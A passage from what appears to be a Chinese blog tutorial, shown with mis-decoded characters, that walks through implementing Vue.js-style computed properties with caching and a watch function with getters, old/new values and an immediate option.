       <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
       effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
       <span class="hljs-comment">//add--æ‡’æ‰§è¡Œè¯¥å‡½æ•°</span>
       <span class="hljs-built_in">if</span>(!options.lazy){
              <span class="hljs-built_in">effectFn</span>()
       }
       <span class="hljs-comment">//add--å°†å‰¯ä½œç”¨å‡½æ•°ä½œä¸ºè¿”å›å€¼è¿”å›</span>
        return effectFn
   }
</code></pre>
<p>æˆ‘ä»¬çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°å…¶å®æ˜¯fn ï¼Œè€ŒeffectFnæ˜¯æˆ‘ä»¬çš„åŒ…è£…çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨resä¸´æ—¶ä¿å­˜æ‰§è¡Œç»“æœï¼Œå¹¶åœ¨æœ€åè¿”å›ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»çœŸæ­£çš„å®ç°è®¡ç®—å‡½æ•°äº†</p>
<h3 data-id="heading-18">è®¡ç®—å‡½æ•° computed</h3>
<p>å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ªæ˜¯ä¸€ä¸ªgetterå‡½æ•°ï¼Œæˆ‘ä»¬ç”¨getterå‡½æ•°ä½œä¸ºå‰¯ä½œç”¨å‚æ•°ï¼Œç”¨å®ƒåˆ›å»ºä¸€ä¸ªlazy çš„effect ,computedå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„valueå±æ€§æ˜¯ä¸€ä¸ªè®¿é—®å™¨å±æ€§ï¼Œåªæœ‰å½“è¯»å–valueå€¼çš„æ—¶å€™ï¼Œæ‰ä¼šæ‰§è¡ŒeffectFn å¹¶å°†å…¶ç»“æœè¿”å›</p>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-comment">/**
* å®ç°ä¸€ä¸ªè®¡ç®—å‡½æ•°
*  <span class="hljs-doctag">@param</span>  <span class="hljs-variable">getter</span>
*  <span class="hljs-doctag">@return</span>  {<span class="hljs-type"> {readonly value: * </span>}|*}
*/</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{<span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>})
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
       <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">return</span> <span class="hljs-title function_">effectFn</span>()
           }
       }
       <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sunRes = <span class="hljs-title function_">computed</span>(<span class="hljs-function">()=&gt;</span>obj.<span class="hljs-property">foo</span>+obj.<span class="hljs-property">bar</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sunRes.<span class="hljs-property">value</span>)
<span class="hljs-comment">//3</span>
</code></pre>
<p>å½“æˆ‘ä»¬è¯»å–sunRes.valueçš„æ—¶å€™ï¼Œè§¦å‘è¯¥å¯¹è±¡çš„getterå‡½æ•°ï¼Œå®ƒçš„getterå‡½æ•°å°±æ˜¯æˆ‘ä»¬æ³¨å†Œçš„å¹¶è¿”å›çš„æ‡’æ‰§è¡Œå‡½æ•°effectFnï¼Œæˆ‘ä»¬åœ¨å…¶å†…éƒ¨å·²ç»å®ç°äº†ï¼ŒåŒ…è£…çš„effectFnçš„æ‰§è¡Œä¼šè¿”å›å…¶å†…éƒ¨çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œç»“æœã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±å®ç°äº†<strong>è®¡ç®—å‡½æ•°</strong>ï¼Œå“ˆå“ˆå“ˆå“ˆï¼ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„</p>
<h3 data-id="heading-19">å¯¹å€¼è¿›è¡Œç¼“å†²</h3>
<p>æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªå“¨å…µå’Œç¼“å†²æ¥å®ç°è¯¥æ•ˆæœã€‚</p>
<p>å½“æˆ‘ä»¬çš„å“¨å…µdirtyä¸ºtrueçš„æ—¶å€™ æˆ‘ä»¬å°±é‡æ–°è·å–æ•°æ®ï¼Œå¦‚æœæ˜¯falseå°±ä¸æ‰§è¡Œï¼Œvalueåˆ™å¯¹ä¸Šæ¬¡çš„æ•°æ®è¿›è¡Œç¼“å†²ã€‚</p>
<p>å¦‚æœå±æ€§æ²¡æœ‰å‘ç”Ÿæ›´æ–° ï¼Œæˆ‘ä»¬ç›´æ¥è¿”å›ä¸Šæ¬¡çš„å€¼ï¼Œå¦‚æœæœ‰åˆ™æ›´æ–°ã€‚</p>
<p>é‚£ä¹ˆå±æ€§æ›´æ–°çš„æ—¶å€™ï¼Œæ€ä¹ˆé€šçŸ¥æˆ‘ä»¬å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨è°ƒåº¦å™¨æ¥å®ç°è¯¥æ•ˆæœã€‚</p>
<p>å½“å±æ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å®ç°äº†è°ƒåº¦å™¨ï¼Œä¼šæ‰§è¡Œè°ƒåº¦å™¨ï¼Œæˆ‘ä»¬æ­£å¥½åœ¨è¿™é‡Œæ¥é‡ç½®å“¨å…µdirty.</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//ç¼“å†²å€¼</span>
   <span class="hljs-keyword">let</span> value ;
   <span class="hljs-comment">//ç”¨æ¥æ ‡è¯†æ˜¯å¦éœ€è¦é‡æ–°è®¡ç®— å½“ä¸ºtrueçš„æ—¶å€™ å°±æ˜¯éœ€è¦é‡æ–°è®¡ç®—</span>
   <span class="hljs-keyword">let</span> dirty = <span class="hljs-literal">true</span>;
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{
      <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>,
      <span class="hljs-title function_">scheduler</span>(<span class="hljs-params"/>){
               <span class="hljs-comment">//åœ¨è°ƒåº¦å™¨é‡Œé¢ é‡ç½® dirty</span>
               <span class="hljs-comment">//å½“ä¾èµ–çš„å±æ€§å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ ä¼šè§¦å‘è°ƒåº¦å™¨çš„æ‰§è¡Œã€‚</span>
               dirty = <span class="hljs-literal">true</span>
           }
       })
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
       <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">if</span>(dirty){
            value = <span class="hljs-title function_">effectFn</span>()
                   dirty = <span class="hljs-literal">false</span>
               }
         <span class="hljs-keyword">return</span> value
           }
       }
       <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<h3 data-id="heading-20">åœ¨æ³¨å†Œå‡½æ•°ä¸­è¯»å–è®¡ç®—å±æ€§æ—¶</h3>
<p>å¥½å¤´ç–¼ ï¼Œæ„Ÿè§‰è¦é•¿è„‘å­ï¼</p>
<p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªeff ect ä¸­è¯»å–è®¡ç®—å±æ€§çš„æ—¶å€™ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">const sunRes = <span class="hljs-built_in">computed</span>(()=&gt;obj<span class="hljs-selector-class">.foo</span>+obj<span class="hljs-selector-class">.bar</span>)
<span class="hljs-built_in">effect</span>(()=&gt;{
    <span class="hljs-comment">//åœ¨è¯¥å‰¯ä½œç”¨å‡½æ•°ä¸­è¯»å–sumRes.value</span>
    console<span class="hljs-selector-class">.log</span>(sunRes.value)
})
<span class="hljs-comment">//ä¿®æ”¹obj.fooçš„å€¼</span>
obj<span class="hljs-selector-class">.foo</span>++
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b0aca29808b4fd5a6a1a589516b757a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=SflQuq%2FUEsXJEs5hn%2BNuS2ngjt4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//ç¼“å†²å€¼</span>
   <span class="hljs-keyword">let</span> value ;
   <span class="hljs-comment">//ç”¨æ¥æ ‡è¯†æ˜¯å¦éœ€è¦é‡æ–°è®¡ç®— å½“ä¸ºtrueçš„æ—¶å€™ å°±æ˜¯éœ€è¦é‡æ–°è®¡ç®—</span>
   <span class="hljs-keyword">let</span> dirty = <span class="hljs-literal">true</span>;
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{
      <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>,
      <span class="hljs-title function_">scheduler</span>(<span class="hljs-params"/>){
         <span class="hljs-comment">//åœ¨è°ƒåº¦å™¨é‡Œé¢ é‡ç½® dirty</span>
               <span class="hljs-comment">//å½“ä¾èµ–çš„å±æ€§å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ ä¼šè§¦å‘è°ƒåº¦å™¨çš„æ‰§è¡Œã€‚</span>
         dirty = <span class="hljs-literal">true</span>
               <span class="hljs-comment">//å½“è®¡ç®—å±æ€§ä¾èµ–çš„å“åº”å¼æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰‹åŠ¨è°ƒç”¨çš„triggerå‡½æ•°è§¦å‘å“åº”</span>
               <span class="hljs-title function_">trigger</span>(obj,<span class="hljs-string">'value'</span>)
           }
       })
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
      <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">if</span>(dirty){
            value = <span class="hljs-title function_">effectFn</span>()
                   dirty = <span class="hljs-literal">false</span>
               }
         <span class="hljs-comment">//å½“è¯»å–valueæ—¶ï¼Œæ‰‹åŠ¨è°ƒç”¨trackå‡½æ•°è¿›è¡Œè¿½è¸ª</span>
         <span class="hljs-keyword">return</span> value
           }
       }
   <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<h2 data-id="heading-21">09 - watchçš„å®ç°åŸç†</h2>
<h3 data-id="heading-22">watchçš„å®ç°åŸç†</h3>
<p><strong>æ‰€è°“çš„watchï¼Œå°±æ˜¯è§‚æµ‹ä¸€ä¸ªå“åº”å¼æ•°æ®ï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™é€šçŸ¥å¹¶æ‰§è¡Œç›¸åº”çš„å›è°ƒå‡½æ•°ã€‚</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watch</span>(obj,<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å˜äº†'</span>)
})
<span class="hljs-comment">//ä¿®æ”¹å“åº”æ•°æ®å€¼ï¼Œä¼šå¯¼è‡´å›è°ƒå‡½æ•°æ‰§è¡Œã€‚</span>
</code></pre>
<p>é‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ³¨å†Œå‰¯ä½œç”¨å‡½æ•°effectå’Œ options.schedulerã€‚</p>
<p>effectçš„æ³¨å†Œå‰¯ä½œç”¨ä¸å°±æ˜¯ è§‚å¯Ÿä¸€ä¸ªå“åº”å¼çš„æ•°æ®å—ï¼Œä½†æ˜¯å®ƒæ˜¯è‡ªåŠ¨æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°çš„ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯æƒ³è¦æ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œè®©å…¶èƒ½å¤Ÿç›´æ¥å›è°ƒã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰å®ç°çš„effectä¸­ï¼Œçš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œæ—¶æœºçš„å®ç°æœºåˆ¶ï¼Œschedulerå°±æ­£å¥½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚</p>
<p><strong>æ‰€ä»¥ watch åŸç†çš„æœ¬è´¨å®é™…ä¸Šå…¶å®æ˜¯åˆ©ç”¨å‰¯ä½œç”¨å‡½æ•°ä»¥åŠå®ƒçš„æ‰§è¡Œæ—¶æœºschedulerå®Œæˆçš„ã€‚</strong></p>
<p>å…¶ä»–çš„åè€Œæ˜¯å¯¹å…¶è¿›è¡Œçš„è¿›ä¸€æ­¥ä¼˜åŒ–</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">/**
* ç®€å•çš„å®ç° ä½¿ç”¨effect ä»¥åŠoptions.scheduler
*/</span>
function <span class="hljs-built_in">watch</span>(source,callback){
       <span class="hljs-built_in">effect</span>(()=&gt;source<span class="hljs-selector-class">.foo</span>,{
       <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
           }
       })
   }
</code></pre>
<p>è§‚å¯Ÿä¸Šé¢çš„ä»£ç ï¼Œå‘ç°æˆ‘ä»¬çš„æ³¨å†Œä»£ç æ˜¯ç›´æ¥å†™æ­»çš„ã€‚</p>
<p>watchçš„æœ¬è´¨æ˜¯ è§‚å¯Ÿä¸€ä¸ªå¯å“åº”å¼å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦å°è£…ä¸€ä¸ªé€šç”¨çš„è¯»å–æ“ä½œçš„å‡½æ•°ã€‚</p>
<h3 data-id="heading-23">é€šç”¨çš„è¯»å–æ“ä½œçš„å‡½æ•°</h3>
<ul>
<li>è¯»å–æ“ä½œï¼Œæˆ‘åªéœ€è¦è¯» å¹¶ä¸éœ€è¦å…¶ä»–çš„æ“ä½œ</li>
<li>éœ€è¦è¯»å–æ‰€æœ‰çš„å±æ€§ æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€’å½’çš„éå†è§‚å¯Ÿå¯¹è±¡ä¸Šçš„æ‰€æœ‰å±æ€§</li>
<li>éœ€è¦é˜²æ­¢å¾ªç¯å¼•ç”¨çš„é—®é¢˜å‡ºç°ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªsetæ¥è¿›è¡Œå‡æ”¯(æ ‘æ)çš„å¤„ç†</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
       <span class="hljs-built_in">effect</span>(()=&gt;<span class="hljs-built_in">traverse</span>(source),{
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
              <span class="hljs-built_in">callback</span>()
           }
       })
   }
function <span class="hljs-built_in">traverse</span>(value,seen = new Set()){
      <span class="hljs-comment">//åˆ¤æ–­é€’å½’çš„è¾¹ç•Œ å¦‚æœæ•°æ®æ˜¯åŸå§‹å€¼æˆ–è€…å·²ç»è¯»å–è¿‡äº†</span>
      <span class="hljs-built_in">if</span>(typeof value !== 'object' || value === null || seen.has(value)){
          return
       }
      <span class="hljs-comment">//å°†æ•°æ®æ·»åŠ åˆ°seen å·²è¿›è¡Œæ•°æ®çš„è¯»å–æ“ä½œ</span>
       seen<span class="hljs-selector-class">.add</span>(value)
       <span class="hljs-comment">//æš‚ä¸è€ƒè™‘å…¶ä»–çš„æ•°æ®ç±»å‹</span>
       <span class="hljs-built_in">for</span>(const key in value){
          <span class="hljs-built_in">traverse</span>(value[key],seen)
       }
       return value
   }

<span class="hljs-built_in">watch</span>(obj,()=&gt;{
       console<span class="hljs-selector-class">.log</span>("æ•°æ®å˜åŒ–äº†",obj.foo)
   })
<span class="hljs-comment">//ä¿®æ”¹obj.fooçš„å€¼</span>
obj<span class="hljs-selector-class">.foo</span>++
</code></pre>
<p>æˆ‘ä»¬åœ¨<code>scheduler</code>ä¸­æ·»åŠ ä¸Šæ‰§è¡Œçš„å›è°ƒã€‚ä½¿ç”¨**<code>traverse</code>** è¯»å–å‡½æ•°è¿›è¡Œé€šç”¨çš„è¯»å–æ“ä½œæ¥è§¦å‘å¯¹å“åº”å¼æ•°æ®çš„è¯»å–ã€‚</p>
<h3 data-id="heading-24">å…¶ä»–å¯å“åº”æ•°æ®çš„è§‚æµ‹</h3>
<p>è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ å¯¹å…¶ä»–å“åº”å¼æ•°æ®çš„è§‚æµ‹ è¿™é‡Œç•™ä¸ªå£å­</p>
<h3 data-id="heading-25">watch æ”¯æŒgetterå‡½æ•°</h3>
<p>watch å‡½æ•°æ—¢å¯ä»¥æ¥æ”¶ä¸€ä¸ªå“åº”å¼å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶ä¸€ä¸ªgetterå‡½æ•°ã€‚</p>
<p>åœ¨getterå‡½æ•°å†…éƒ¨ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šè¯¥watchä¾èµ–å“ªäº›å“åº”å¼æ•°æ®ï¼Œåªæœ‰å½“è¿™äº›å“åº”å¼æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰ä¼šè§¦å‘å›è°ƒå‡½æ•°æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
   <span class="hljs-comment">//å®šä¹‰getter</span>
       let getter;
       <span class="hljs-built_in">if</span>(typeof source === 'function'){
      getter = source
       }else{
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
           getter = ()=&gt;<span class="hljs-built_in">traverse</span>(source)
       }
       <span class="hljs-built_in">effect</span>(()=&gt; <span class="hljs-built_in">getter</span>(),{
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
         <span class="hljs-built_in">callback</span>()
           }
       })
   }
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨å“åº”å¼å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨getterå‡½æ•°ã€‚ç°åœ¨æˆ‘ä»¬è¿˜ç¼ºæœ€é‡è¦çš„ä¸€ä¸ªèƒ½åŠ›ï¼Œæ–°æ—§å€¼çš„æ¯”è¾ƒä¼ é€’ã€‚</p>
<h3 data-id="heading-26">æ”¯æŒæ–°æ—§å€¼çš„ä¼ é€’</h3>
<p>è¿™é‡Œè¦å¦‚ä½•è·å–æ–°å€¼ä¸æ—§å€¼å‘¢ï¼Ÿ</p>
<p>è¿™éœ€è¦å……åˆ†åˆ©ç”¨eff ect å‡½æ•°çš„lazyé€‰é¡¹ï¼Œå¦‚ä»¥ä¸‹ä»£ç æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source,callback){
   <span class="hljs-comment">//å®šä¹‰getter</span>
       let getter;
       <span class="hljs-built_in">if</span>(typeof source === 'function'){
      getter = source
       }else{
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
           getter = ()=&gt;<span class="hljs-built_in">traverse</span>(source)
       }

   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
      let oldValue,newValue
       <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
      const effectFn =  <span class="hljs-built_in">effect</span>(()=&gt; <span class="hljs-built_in">getter</span>(),{
      lazy:true,
      <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
         newValue = <span class="hljs-built_in">effectFn</span>()
         <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
         <span class="hljs-built_in">callback</span>(newValue,oldValue)
               <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
               oldValue = newValue
           }
       })
       <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
       oldValue = <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæœ€æ ¸å¿ƒçš„æ”¹åŠ¨æ˜¯ä½¿ç”¨äº†lazyé€‰é¡¹åˆ›å»ºäº†ä¸€ä¸ªæ‡’æ‰§è¡Œçš„effectï¼Œ<strong>æ³¨æ„ä¸Šé¢ä»£ç ä¸­æœ€ä¸‹é¢çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨äº†effectFnå‡½æ•°å¾—åˆ°çš„è¿”å›å€¼å°±æ˜¯æ—§å€¼</strong>ï¼Œè¿™æ˜¯ä¸€æ¬¡åˆå§‹åŒ–çš„è°ƒç”¨ï¼Œæ˜¯åœ¨è§‚æµ‹å“åº”å¼æ•°æ®æ—¶ç›´æ¥æ‹¿åˆ°çš„åˆå§‹å€¼ã€‚å½“å˜åŒ–å‘ç”Ÿå¹¶è§¦å‘äº†schedulerè°ƒåº¦å‡½æ•°å¹¶æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šé‡æ–°è°ƒç”¨effectFnå‡½æ•°å¹¶å¾—åˆ°æ–°çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±åŒæ—¶æ‹¿åˆ°äº†æ–°å€¼å’Œæ—§å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å›è°ƒå‡½æ•°ä¸­åŒæ—¶è¿”å›äº†ã€‚</p>
<p>æœ€åä¸€ä»¶éå¸¸é‡è¦çš„æ˜¯ä¸è¦å¿˜è®°æ›´æ–°æ—§çš„å€¼ã€‚è¿™æ · æ–°å€¼å˜æ—§å€¼ï¼Œå°±å¯ä»¥ä¸€ç›´è·‘èµ·æ¥äº†ã€‚</p>
<h2 data-id="heading-27">10-ç«‹å³æ‰§è¡Œçš„watchå›è°ƒä¸æ‰§è¡Œæ—¶æœº</h2>
<p>watch çš„ä¸¤ä¸ªç‰¹æ€§ï¼š</p>
<h3 data-id="heading-28">ç«‹å³æ‰§è¡Œçš„å›è°ƒå‡½æ•°</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œwatchçš„å›è°ƒå‡½æ•°åªä¼šåœ¨å“åº”å¼æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œï¼Œé‚£ä¹ˆå¦‚ä½•è®©å…¶ç«‹å³æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>Vue.jsä¸­å¯ä»¥é€šè¿‡é€‰é¡¹å‚æ•°çš„immediateæ¥æŒ‡å®šå›è°ƒæ˜¯å¦éœ€è¦ç«‹å³æ‰§è¡Œã€‚</p>
<p>å½“immediateä¸ºtrueçš„æ—¶å€™ æˆ‘ä»¬æŠ½å–çš„scheduler å…¬å…±å‡½æ•°å°±æ‰§è¡Œä¸€æ¬¡ï¼Œå®ƒé‡Œé¢åŒ…å«äº†watchçš„å›è°ƒå‡½æ•°callback,</p>
<p>å¦‚æœä¸ºfalseçš„æ—¶å€™ï¼Œå°±è¿˜æ˜¯é»˜è®¤æ‰§è¡Œæˆ‘ä»¬çš„effectFn å®ƒåªæ˜¯å•çº¯çš„è¿”å›çš„å‰¯ä½œç”¨å›è°ƒå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡å®ƒæ‹¿åˆ°ä¸€æ¬¡é»˜è®¤çš„å€¼ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">watch</span>(source, callback, options = {}) {
   <span class="hljs-comment">//å®šä¹‰getter</span>
   let getter;
   if (typeof source === 'function') {
      getter = source
   } else {
      <span class="hljs-comment">//å¦åˆ™æŒ‰ç…§åŸæ¥çš„å®ç°è°ƒç”¨traverseé€’å½’åœ°è¯»å–</span>
      getter = () =&gt; <span class="hljs-built_in">traverse</span>(source)
   }
   <span class="hljs-comment">//å®šä¹‰æ—§å€¼ä¸æ–°å€¼</span>
   let oldValue, newValue
   <span class="hljs-comment">//æå–schedulerè°ƒåº¦å‡½æ•°ä¸ºä¸€ä¸ªç‹¬ç«‹çš„jobå‡½æ•°</span>
   const job = () =&gt; {
      <span class="hljs-comment">//åœ¨ scheduler ä¸­é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¾—åˆ°çš„æ˜¯æ–°å€¼</span>
      newValue = <span class="hljs-built_in">effectFn</span>()
      <span class="hljs-comment">//å°†æ—§å€¼ä¸æ–°å€¼ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span>
      <span class="hljs-built_in">callback</span>(newValue, oldValue)
      <span class="hljs-comment">//æ›´æ–°æ—§å€¼ï¼Œ</span>
      oldValue = newValue
   }
   <span class="hljs-comment">//ä½¿ç”¨effectæ³¨å†Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå¼€å¯lazyé€‰é¡¹ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜å‚¨åˆ°effectFnä¸­ä¸€éåç»­æ‰‹åŠ¨è°ƒç”¨</span>
   const effectFn = <span class="hljs-built_in">effect</span>(() =&gt; <span class="hljs-built_in">getter</span>(), {
      lazy: true,
      scheduler: job
   })
   <span class="hljs-comment">//å½“ immediate ä¸º trueçš„æ—¶å€™ ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
   <span class="hljs-comment">//å¦‚æœä¸æ˜¯ åˆ™æˆ‘ä»¬å°±æ‹¿ä¸€ä¸‹åˆå§‹å€¼å°±å¯ä»¥ã€‚</span>
   if (options.immediate) {
      <span class="hljs-built_in">job</span>()
   } else {
      <span class="hljs-comment">//æ‰‹åŠ¨è°ƒç”¨ å…ˆé‚£ä¸€ä¸‹åˆå§‹åŒ–çš„å€¼</span>
      <span class="hljs-comment">//è¿™é‡Œçš„å…³é”®æ˜¯ è¿™é‡Œçš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨ å¹¶ä¸ä¼šæ‰§è¡Œ watchçš„å›è°ƒå‡½æ•° æ‰€ä»¥å®ƒæ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</span>
      oldValue = <span class="hljs-built_in">effectFn</span>()
   }
}
</code></pre>
<h3 data-id="heading-29">å›è°ƒå‡½æ•°çš„æ‰§è¡Œæ—¶æœº</h3>
<p>è¿™é‡Œä½¿ç”¨**<code>flush:'pre'</code>** <strong><code>//'post' |'sync'</code></strong> æ¥æ§åˆ¶æ‰§è¡Œçš„æ—¶æœºï¼Œå¦‚æœè®¾ç½®ä¸º Post ,å°±æŠŠä»»åŠ¡æ”¾åœ¨å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œä»è€Œå®ç°å¼‚æ­¥å»¶è¿Ÿæ‰§è¡Œï¼Œå¦åˆ™å°±ç«‹å³æ‰§è¡Œã€‚</p>
